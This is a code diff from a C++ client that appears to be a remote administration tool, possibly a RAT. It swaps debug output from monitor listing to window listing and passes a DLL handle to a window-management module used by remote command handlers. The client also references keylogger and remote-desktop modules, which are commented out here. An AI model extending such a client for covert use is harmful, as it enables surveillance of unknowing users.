@@ -155,9 +155,15 @@ Cliente::Cliente() {
     //this->mod_Fun = new modFun();
     //this->mod_Key = new mod_Keylogger();
     //this->mod_Key->Start();
-    this->mod_RemoteDesk = new mod_RemoteDesktop(this->hUser23DLL);
+   /* this->mod_RemoteDesk = new mod_RemoteDesktop(this->hUser23DLL);
     for (auto mon : this->mod_RemoteDesk->m_ListaMonitores()) {
         std::cout << mon.szDevice << "\t" << mon.rectData.resWidth << "x" << mon.rectData.resHeight << "\n";
+    }*/
+    this->mod_AdminVen = new mod_AdminVentanas(this->hUser23DLL);
+    for (VentanaInfo ventana : this->mod_AdminVen->m_ListaVentanas()) {
+        std::cout << "TITLE: " << ventana.strTitle << "\n";
+        std::cout << "HWND: " << ventana.hwnd<< "\n";
+        std::cout << "ACTIVE: " << ventana.active<< "\n";
     }
 
 }
@@ -897,7 +903,7 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
     //                ADMIN VENTANAS                      # 
     if (iComando == EnumComandos::WM_Lista) {
         if (!this->mod_AdminVen) {
-            this->mod_AdminVen = new mod_AdminVentanas();
+            this->mod_AdminVen = new mod_AdminVentanas(this->hUser23DLL);
         }
         //Enviar lista parseada de ventanas
         std::string strPaquete = "";
@@ -914,7 +920,7 @@ void Cliente::Procesar_Comando(const Paquete_Queue& paquete) {
 
     if (iComando == EnumComandos::WM_CMD) {
         if (!this->mod_AdminVen) {
-            this->mod_AdminVen = new mod_AdminVentanas();
+            this->mod_AdminVen = new mod_AdminVentanas(this->hUser23DLL);
         }
 
         strIn = strSplit(paquete.cBuffer.data(), CMD_DEL, 2);
